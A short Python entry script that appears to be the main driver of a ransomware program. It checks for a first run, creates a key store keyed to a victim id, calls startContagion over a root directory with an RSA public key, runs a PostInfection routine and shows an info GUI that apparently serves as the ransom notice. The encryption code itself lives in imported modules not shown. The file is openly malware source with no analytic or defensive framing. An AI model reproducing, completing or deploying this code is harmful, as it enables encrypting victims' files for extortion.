import guiMode
from guiMode import InfoGUI

if guiMode.checkFirstTime():
    guiMode.displayInfoGUI()
    exit()

import starter
import utils
from postInfection import PostInfection

starter.keyStoreCreate(utils.version, utils.what_is_my_id)
starter.startContagion(utils.root_directory, utils.rsa_public_key)
PostInfection().firstWork()


guiMode.displayInfoGUI(utils.aesIV_file_store_path)